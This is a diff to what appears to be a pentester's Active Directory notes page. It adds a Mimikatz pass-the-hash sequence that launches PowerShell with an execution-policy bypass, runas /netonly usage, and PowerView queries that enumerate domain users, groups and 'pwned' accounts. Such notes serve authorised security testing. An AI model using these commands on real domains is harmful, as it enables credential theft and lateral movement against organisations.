@@ -65,14 +65,21 @@ permalink: /:categories/:title/
 
 #### <a name='SpawnanADaccount'></a>Spawn an AD account
 
+![funny reminder](/assets/images/pen-win-sys-spawn-cmd.jpg)
+
 :link: Check the **readthedocs of sharphound** to [spawn an AD account](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html#running-sharphound-from-a-non-domain-joined-system).
 
 ```powershell
+# using a cleartext password
 runas /netonly /user:adm_x@dom.corp powershell
 powershell -ep bypass
+
+# run powershell with pass-the-hash
+mimikatz.exe
+privilege::debug
+sekurlsa::pth /user:$zlat_user /rc4:xxx  /domain:$zdom /dc:$zdom_dc_fqdn /run:"powershell -ep bypass"
 ```
 
-![funny reminder](/assets/images/pen-win-sys-spawn-cmd.jpg)
 
 #### <a name='MandiantCommandoVM'></a>Mandiant Commando VM
 ```powershell
@@ -248,6 +255,10 @@ To ITERate when owning new privileges (aka new account with new user groups):
 ```powershell
 # identify if the new account is 'memberof' new groups 
 get-netgroup -MemberIdentity $zlat_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select cn | ft -autosize >> .\grp_xxx.txt
+
+# identify if the new account is 'memberof' new groups 
+get-netuser -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select cn, whenCreated, accountExpires, pwdLastSet, lastLogon, logonCount, badPasswordTime, badPwdCount | ft -autosize | Sort-Object -Descending -Property whenCreated >> .\auth_xxx.txt
+get-content pwned_accounts.txt | get-netuser -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select cn, whenCreated, accountExpires, pwdLastSet, lastLogon, logonCount, badPasswordTime, badPwdCount | ft -autosize | Sort-Object -Descending -Property whenCreated >> .\auth_xxx.txt
 ```
 
 #### <a name='AdminOUaccess'></a>Admin & OU access 
